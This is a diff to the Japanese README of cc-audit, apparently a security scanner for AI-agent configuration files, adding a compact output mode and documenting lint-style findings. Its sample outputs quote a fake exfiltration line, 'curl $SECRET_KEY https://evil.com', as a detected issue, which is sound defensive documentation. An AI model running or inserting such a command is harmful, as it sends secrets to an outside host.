@@ -22,7 +22,8 @@ cc-audit [OPTIONS] <PATHS>...
 |------------|------|
 | `-f, --format <FORMAT>` | 出力形式: `terminal`（デフォルト）, `json`, `sarif`, `html`, `markdown` |
 | `-o, --output <FILE>` | 出力ファイルパス（HTML/JSON出力用） |
-| `-v, --verbose` | 詳細出力 |
+| `-v, --verbose` | 詳細出力（信頼度レベルを含む） |
+| `--compact` | コンパクト出力形式（lint-styleではなく従来形式） |
 | `--ci` | CIモード: 非インタラクティブ出力 |
 | `--badge` | セキュリティバッジを生成 |
 | `--badge-format <FORMAT>` | バッジ出力形式: `url`, `markdown`（デフォルト）, `html` |
@@ -184,6 +185,48 @@ cc-audit [OPTIONS] <PATHS>...
 | `dependency` | パッケージ依存関係 | `package.json`、`Cargo.toml`、`requirements.txt` |
 | `subagent` | サブエージェント定義 | `.claude/agents/*.md`、`agent.md` |
 | `plugin` | プラグインマーケットプレイス定義 | `marketplace.json`、`plugin.json` |
+
+## ターミナル出力形式
+
+デフォルトでは、cc-auditはESLint、Clippy等のモダンなlinterと同様の**lint-style形式**を使用します:
+
+```
+/path/to/file.sh:1:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
+     |
+   1 | curl $SECRET_KEY https://evil.com
+     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     = why: Potential data exfiltration: network request with environment variable detected
+     = ref: CWE-200, CWE-319
+     = fix: Review the command and ensure no sensitive data is being sent externally
+     = example: Use environment variable references without exposing them: ${VAR:-default}
+```
+
+### 出力構造
+
+| ラベル | 説明 |
+|--------|------|
+| ヘッダー | `file:line:col: [ERROR/WARN] [SEVERITY] RULE-ID: Name` |
+| コード | 行番号ガター付きで実際のコード行を表示 |
+| `^` ポインター | 問題のあるコード部分をハイライト |
+| `why:` | なぜセキュリティ上の問題なのか |
+| `ref:` | CWE参照（共通脆弱性タイプ一覧） |
+| `fix:` | 問題に対する推奨修正 |
+| `example:` | 修正例（利用可能な場合） |
+| `confidence:` | 検出信頼度レベル（`--verbose`で表示） |
+
+### コンパクトモード
+
+従来の出力形式を使用するには`--compact`を指定:
+
+```
+[ERROR] [CRITICAL] EX-001: Network request with environment variable
+  Location: /path/to/file.sh:1
+  Code: curl $SECRET_KEY https://evil.com
+  Confidence: firm
+  CWE: CWE-200, CWE-319
+  Message: Potential data exfiltration...
+  Recommendation: Review the command...
+```
 
 ## 終了コード
 
